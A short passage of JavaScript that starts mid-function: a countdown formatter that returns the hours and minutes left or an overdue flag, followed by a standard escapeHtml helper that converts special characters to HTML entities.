  if (diff <= 0) return "⚠️ OVERDUE";
  const hours = Math.floor(diff / (1000 * 60 * 60));
  const mins = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
  return `${hours}h ${mins}m left`;
}

function escapeHtml(str) {
  if (!str) return "";
  return String(str)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}
